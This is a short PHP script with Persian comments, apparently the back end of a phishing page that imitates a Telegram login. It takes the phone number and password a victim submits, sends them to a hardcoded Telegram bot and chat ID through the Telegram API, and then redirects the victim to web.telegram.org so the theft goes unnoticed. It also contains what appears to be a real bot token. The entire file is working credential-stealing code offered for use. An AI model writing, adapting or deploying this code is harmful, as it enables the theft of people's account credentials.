<?php
// توکن بات تلگرام (از BotFather دریافت کنید)
$bot_token = '7067877978:AAGQs_8pTLYvU5fgtZWR0_LL43QazKNJFLY'; 

// شناسه چت یا گروه تلگرام که اطلاعات به آن ارسال خواهد شد
$chat_id = '7208236708'; 

// دریافت شماره تلفن و رمز عبور از فرم
$phone = $_POST['phone'];
$password = $_POST['password'];

// ساخت پیام برای ارسال به تلگرام
$message = "📱 شماره تلفن: " . $phone . "\n🔑 رمز عبور: " . $password;

// ارسال پیام به تلگرام با استفاده از API تلگرام
$send_url = "https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($message);

// ارسال درخواست به تلگرام
$response = file_get_contents($send_url);

// هدایت کاربر به صفحه اصلی تلگرام بعد از ارسال اطلاعات
header('Location: https://web.telegram.org');
exit;
?>
